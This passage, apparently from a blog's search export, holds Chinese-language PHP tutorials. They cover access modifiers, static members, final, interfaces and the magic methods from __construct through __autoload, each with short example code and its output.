<p>protected关键字:定义受保护的成员属性或方法，只允许类本身或子类使用</p>
<p>private关键字:定义私有的成员属性或方法，只允许类的本身使用</p>
<h4 id="4-静态"><a href="#4-静态" class="headerlink" title="4.静态"></a>4.静态</h4><p>static关键字</p>
<ul>
<li>静态属性用于保存类的公有数据；</li>
<li>静态方法里面只能访问静态属性或方法，<strong>不能使用 $this 伪变量</strong>；</li>
<li>静态成员<strong>不需要通过 new 关键字来实例化对象</strong>就可访问使用；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    static $name=&quot;张三&quot;;</span><br><span class="line">    static function say()&#123;</span><br><span class="line">        echo &quot;我的名字叫:&quot;.self::$name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo human::$name;   //以此来调用静态属性$name</span><br><span class="line">human::say();   //以此来使用静态方法say</span><br></pre></td></tr></table></figure>

<p>输出 张三我的名字叫:张三</p>
<h4 id="5-final关键字"><a href="#5-final关键字" class="headerlink" title="5.final关键字"></a>5.final关键字</h4><p>不允许成员方法被重写，不允许被继承</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class human&#123;</span><br><span class="line">    final public function eat()&#123;   //这样这个eat方法子类将不能使用</span><br><span class="line">        echo &quot;父亲吃饭的方法，不允许子类重写&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">final class sport extends human&#123;  //这样sport不能再创建子类</span><br><span class="line">    public function eat()&#123;</span><br><span class="line">        echo &quot;子类吃饭的方法，此时程序将会报致命错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class student extends sport&#123;  //这里继承了sport类会报错</span><br><span class="line">    public $name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h=new sport();</span><br><span class="line">$h-&gt;eat();</span><br><span class="line"></span><br><span class="line">$j=new student();</span><br><span class="line">$j-&gt;name=&quot;张三&quot;;</span><br></pre></td></tr></table></figure>

<p>上面输出的结果会报错</p>
<h4 id="6-接口"><a href="#6-接口" class="headerlink" title="6.接口"></a>6.接口</h4><p>定义接口关键字：interface</p>
<p>实现接口方法关键字：implements</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">interface caneat&#123;   //定义一个接口</span><br><span class="line">    public function eat($food);</span><br><span class="line">&#125;</span><br><span class="line">class human implements caneat&#123;   //连接接口</span><br><span class="line">    public function eat($food)&#123;</span><br><span class="line">        echo &quot;我吃：&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class animal implements caneat&#123;  //连接接口</span><br><span class="line">    public function eat($food)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;我吃:&quot;.$food;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$people=new human();</span><br><span class="line">$people-&gt;eat(&#x27;rice&#x27;);</span><br><span class="line"></span><br><span class="line">$monkey=new animal();</span><br><span class="line">$monkey-&gt;eat(&#x27;banana&#x27;);</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>我吃：rice我吃:banana</p>
]]></content>
  </entry>
  <entry>
    <title>魔术方法</title>
    <url>/2022/11/11/%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>PHP的基本魔术方法</p>
<span id="more"></span>

<p>PHP中把以两个下划线__开头的方法称为魔术方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了__construct()，__destruct()和__clone()之外的所有魔术方法都 必须声明为 public</span><br></pre></td></tr></table></figure>

<h4 id="1-construct-，类的构造函数"><a href="#1-construct-，类的构造函数" class="headerlink" title="1.__construct()，类的构造函数"></a>1.__construct()，类的构造函数</h4><p>通常构造方法被用来执行一些有用的初始化任务，如对成员属性在创建对象时赋予初始值。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">//先声明属性</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=&quot;18&quot;)//这里是规定的初始值</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;我叫:&quot;. $this-&gt;name .&quot;，性别:&quot;.$this-&gt;sex.&quot;，年龄:&quot;.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person1=new person(&quot;小明&quot;,&quot;女&quot;,&quot;23&quot;);//这里可以改变初始值，如果什么都没有就会返回初始值</span><br><span class="line">echo $person1-&gt;say();//调用say方法</span><br></pre></td></tr></table></figure>

<p>这样可以输出  我叫:小明，性别:女，年龄:23</p>
<h4 id="2-destruct-类的析构函数"><a href="#2-destruct-类的析构函数" class="headerlink" title="2.__destruct(), 类的析构函数"></a>2.__destruct(), 类的析构函数</h4><p>析构方法允许在销毁一个类之前执行的一些操作或完成一些功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line">    public $sex;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$sex=&quot;男&quot;,$age=&quot;18&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo &quot;我叫:&quot;. $this-&gt;name .&quot;，性别:&quot;.$this-&gt;sex.&quot;，年龄:&quot;.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()&#123;</span><br><span class="line">        echo &quot;你好&quot;.$this-&gt;name;   //当unset使用时就会输出</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person1=new person(&quot;1&quot;);</span><br><span class="line">unset($person1);//摧毁上面的对象</span><br></pre></td></tr></table></figure>

<p>输出为你好1</p>
<h4 id="3-call-在对象中调用一个不可访问方法时调用"><a href="#3-call-在对象中调用一个不可访问方法时调用" class="headerlink" title="3.__call(), 在对象中调用一个不可访问方法时调用"></a>3.__call(), 在对象中调用一个不可访问方法时调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">格式</span><br><span class="line">function __call($function,$arguments)&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个参数是会自动接收不存在的方法名，第二个参数是以数组的方式接收不存在方法的多个参数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    function say()&#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __call($h,$j)&#123;    //如果调用的方法不存在就会输出这个方法内的东西</span><br><span class="line">        echo &quot;你调用的函数是&quot;.$h.&quot;(参数：&quot;;</span><br><span class="line">        print_r($j);</span><br><span class="line">        echo &quot;)不存在!&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person1=new person();</span><br><span class="line">$person1-&gt;run(&#x27;tea&#x27;);//run方法不存在</span><br><span class="line">$person1-&gt;eat(&#x27;小明&#x27;);//eat方法不存在</span><br><span class="line">$person1-&gt;say();</span><br></pre></td></tr></table></figure>

<p>输出以下</p>
<p>你调用的函数是run(参数：Array ( [0] &#x3D;&gt; tea ) )不存在!<br>你调用的函数是eat(参数：Array ( [0] &#x3D;&gt; 小明 ) )不存在!<br>hello</p>
<h4 id="4-callStatic-，用静态方式中调用一个不可访问方法时调用"><a href="#4-callStatic-，用静态方式中调用一个不可访问方法时调用" class="headerlink" title="4.__callStatic()，用静态方式中调用一个不可访问方法时调用"></a>4.__callStatic()，用静态方式中调用一个不可访问方法时调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class person&#123;</span><br><span class="line">    function say()&#123;</span><br><span class="line">        echo &quot;hello&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public static function __callStatic($h,$j)&#123;  //当调用的方法不存在时就会自动使用这个方法</span><br><span class="line">        echo &quot;你调用的函数是&quot;.$h.&quot;(参数：&quot;;</span><br><span class="line">        print_r($j);</span><br><span class="line">        echo &quot;)不存在!&lt;br/&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person1=new person();</span><br><span class="line">$person1::run(&#x27;tea&#x27;);//使用静态方法，但run方法不存在</span><br><span class="line">$person1::eat(&#x27;小明&#x27;);//使用静态方法，但eat方法不存在</span><br><span class="line">$person1-&gt;say();</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>你调用的函数是run(参数：Array ( [0] &#x3D;&gt; tea ) )不存在!<br>你调用的函数是eat(参数：Array ( [0] &#x3D;&gt; 小明 ) )不存在!<br>hello</p>
<h4 id="5-get-，获得一个类的成员变量时调用"><a href="#5-get-，获得一个类的成员变量时调用" class="headerlink" title="5.__get()，获得一个类的成员变量时调用"></a>5.__get()，获得一个类的成员变量时调用</h4><p>类的成员属性被设定为 private 后，如果我们试图在外面调用它则会出现“不能访问某个私有属性”的错误，可以使用__get解决</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;,$age=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function __get($h)&#123;</span><br><span class="line">        if($this-&gt;age &gt;2)&#123;</span><br><span class="line">            echo &#x27;234&#x27;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &#x27;re&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person=new user(2,1);</span><br><span class="line">echo $person-&gt;age;//调用私有的属性，会自动使用__get方法</span><br></pre></td></tr></table></figure>

<p>输出re</p>
<h4 id="6-set-，设置一个类的成员变量时调用"><a href="#6-set-，设置一个类的成员变量时调用" class="headerlink" title="6.__set()，设置一个类的成员变量时调用"></a>6.__set()，设置一个类的成员变量时调用</h4><p>当设置不存在的属性时，系统会自动触发对象所在类的定义好的__set方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    function __construct($name=&quot;&quot;,$age=&quot;&quot;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name = $name;</span><br><span class="line">        $this-&gt;age = $age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($h,$v)&#123;   //如果调用的属性不存在或者无法使用，就会自动输出__set方法</span><br><span class="line">       echo $this-&gt;$h=$v; //$h在这里相当于name属性，$v相当于&quot;小红&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function say()&#123;</span><br><span class="line">        echo $this-&gt;name.$this-&gt;age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$person=new user(&quot;小明&quot;,25);</span><br><span class="line">$person-&gt;name=&quot;小红&quot;;//使用私有的属性，没有__set一般会报错</span><br></pre></td></tr></table></figure>

<p>输出小红</p>
<h4 id="7-isset-，当对不可访问属性调用isset-或empty-时调用"><a href="#7-isset-，当对不可访问属性调用isset-或empty-时调用" class="headerlink" title="7.__isset()，当对不可访问属性调用isset()或empty()时调用"></a>7.__isset()，当对不可访问属性调用isset()或empty()时调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __isset($j)  //当调用一个不存在或者无法调用的属性时，__isset方法就会自动调用</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;自动调用&#x27;;</span><br><span class="line">        echo isset($this-&gt;$j);//这里来执行isset的动作，返回值为1说明存在，不返回1说明不存在</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">echo isset($h-&gt;name);//name属性为私有，没有__isset就会报错</span><br><span class="line">//isset() 函数用于检测变量是否已设置并且非 NULL</span><br></pre></td></tr></table></figure>

<p>输出自动调用1</p>
<p>__isset()的()中必须规定一个参数，否侧无法使用</p>
<h4 id="8-unset-，当对不可访问属性调用unset-时被调用。"><a href="#8-unset-，当对不可访问属性调用unset-时被调用。" class="headerlink" title="8.__unset()，当对不可访问属性调用unset()时被调用。"></a>8.__unset()，当对不可访问属性调用unset()时被调用。</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    private $name;</span><br><span class="line">    private $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __unset($j)  //当一个对象调用一个无法调用的属性时，__unset方法会自动被调用</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#x27;自动调用&#x27;;</span><br><span class="line">        echo isset($this-&gt;$j);//这里执行删除动作，执行后返回值为1</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">unset($h-&gt;sex);//sex为公有可以直接删除</span><br><span class="line">unset($h-&gt;name);//name为私有无法，没有__unset就会报错</span><br></pre></td></tr></table></figure>

<p>输出自动调用1</p>
<h4 id="9-sleep-，执行serialize-时，先会调用这个函数"><a href="#9-sleep-，执行serialize-时，先会调用这个函数" class="headerlink" title="9.__sleep()，执行serialize()时，先会调用这个函数"></a>9.__sleep()，执行serialize()时，先会调用这个函数</h4><p>serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，则该方法会优先被调用，然后才执行序列化操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;</span><br><span class="line">        echo &#x27;返回&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;,&#x27;age&#x27;,&#x27;sex&#x27;);//将name，age，sex的值都序列化</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;小明&#x27;);</span><br><span class="line">echo serialize($h);//该操作不会执行，而是执行__sleep方法</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>返回O:4:”user”:3:{s:4:”name”;s:6:”小明”;s:3:”age”;i:25;s:3:”sex”;s:3:”男”;}</p>
<h4 id="10-wakeup-，执行unserialize-时，先会调用这个函数"><a href="#10-wakeup-，执行unserialize-时，先会调用这个函数" class="headerlink" title="10.__wakeup()，执行unserialize()时，先会调用这个函数"></a>10.__wakeup()，执行unserialize()时，先会调用这个函数</h4><p>__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __sleep()&#123;   //自动调用后再e进行序列化</span><br><span class="line">        echo &#x27;返回&#x27;;</span><br><span class="line">        return array(&#x27;name&#x27;,&#x27;age&#x27;,&#x27;sex&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()   //自动调用后进行反序列化</span><br><span class="line">    &#123;</span><br><span class="line">        echo&quot;调用__wakeup&quot;;</span><br><span class="line">        $this-&gt;age=1;//这里可以改变属性的值</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;小明&#x27;);</span><br><span class="line">var_dump(serialize($h));//先将$h序列化</span><br><span class="line">var_dump(unserialize(serialize($h)));//将序列化的$h反序列化</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>返回string(74) “O:4:”user”:3:{s:4:”name”;s:6:”小明”;s:3:”age”;i:25;s:3:”sex”;s:3:”男”;}” 返回调用__wakeupobject(user)#2 (3) { [“sex”]&#x3D;&gt; string(3) “男” [“name”]&#x3D;&gt; string(6) “小明” [“age”]&#x3D;&gt; int(1) }</p>
<h4 id="11-toString-，对象被当成字符串时的回应方法"><a href="#11-toString-，对象被当成字符串时的回应方法" class="headerlink" title="11.__toString()，对象被当成字符串时的回应方法"></a>11.__toString()，对象被当成字符串时的回应方法</h4><p>用于一个对象被当成字符串时应怎样回应。例如 <code>echo $obj;</code> 应该显示些什么。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public  function __tostring()&#123;  //在对象被当作字符串输出时会自动调用__tostring方法</span><br><span class="line">        return &#x27;go&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">echo $h;//这样会报错，正确的一般是$h-&gt;属性或者方法</span><br></pre></td></tr></table></figure>

<p>输出go</p>
<h4 id="12-invoke-，使用调用函数的方式调用一个对象时的回应方法"><a href="#12-invoke-，使用调用函数的方式调用一个对象时的回应方法" class="headerlink" title="12.__invoke()，使用调用函数的方式调用一个对象时的回应方法"></a>12.__invoke()，使用调用函数的方式调用一个对象时的回应方法</h4><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()&#123;  //当把对象当作函数使用时，就会自动调用__invoke，可以防止报错</span><br><span class="line">        echo &#x27;123&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();</span><br><span class="line">$h();//这样可以调用函数，但无法调用一个对象，没有__invoke就会报错</span><br></pre></td></tr></table></figure>

<p>输出123</p>
<h4 id="13-set-state-，调用var-export-导出类时，此静态方法会被调用"><a href="#13-set-state-，调用var-export-导出类时，此静态方法会被调用" class="headerlink" title="13.__set_state()，调用var_export()导出类时，此静态方法会被调用"></a>13.__set_state()，调用var_export()导出类时，此静态方法会被调用</h4><p>当调用 var_export() 导出类时，此静态方法会被自动调用。</p>
<h4 id="14-clone-，当对象复制完成时调用"><a href="#14-clone-，当对象复制完成时调用" class="headerlink" title="14.__clone()，当对象复制完成时调用"></a>14.__clone()，当对象复制完成时调用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $sex;</span><br><span class="line">    public $name;</span><br><span class="line">    public $age;</span><br><span class="line"></span><br><span class="line">    public function __construct($name=&quot;&quot;,$age=25,$sex=&#x27;男&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name=$name;</span><br><span class="line">        $this-&gt;age=$age;</span><br><span class="line">        $this-&gt;sex=$sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __clone()&#123; //复制时自动调用此方法</span><br><span class="line">        echo &quot;正在复制&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user(&#x27;小明&#x27;);</span><br><span class="line">$h1=clone $h; //复制的语法</span><br><span class="line">var_dump($h);//输出原来的数据</span><br><span class="line">var_dump($h1);//输出复制完成后的数据</span><br></pre></td></tr></table></figure>

<p>输出</p>
<p>正在复制user Object ( [sex] &#x3D;&gt; 男 [name] &#x3D;&gt; 小明 [age] &#x3D;&gt; 25 )<br>user Object ( [sex] &#x3D;&gt; 男 [name] &#x3D;&gt; 小明 [age] &#x3D;&gt; 25 )</p>
<h4 id="15-autoload-，实现自动加载"><a href="#15-autoload-，实现自动加载" class="headerlink" title="15.__autoload()，实现自动加载"></a>15.__autoload()，实现自动加载</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在php中一般一个类为一个php文件，我们用类时需要使用include()函数进行一个一个的包含才可以使用，这样耗时太多，所以可以使用__autoload()函数，我们只需要使用一次__autoload()函数就可以直接使用类，无需使用include()函数将每个类包含进来</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*user.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public function show()&#123;</span><br><span class="line">        echo &quot;wo&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*5.php*/</span><br><span class="line">&lt;?php</span><br><span class="line">function __autoload($classname)&#123;</span><br><span class="line">    $classpath=$classname.&quot;.php&quot;;//$classname参数会自动换为我们所使用的类名，</span><br><span class="line">    if(file_exists($classpath))&#123;  //检验这个这个文件是否存在</span><br><span class="line">        require_once ($classpath);  //连接该文件</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &#x27;not found&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$h=new user();  //直接使用该类</span><br><span class="line">echo $h-&gt;show();</span><br><span class="line"></span><br><span class="line">在5.php中输出为wo</span><br></pre></td></tr></table></figure>



<h4 id="16-debugInfo-，打印所需调试信息"><a href="#16-debugInfo-，打印所需调试信息" class="headerlink" title="16.__debugInfo()，打印所需调试信息"></a>16.__debugInfo()，打印所需调试信息</h4>]]></content>
  </entry>
</search>
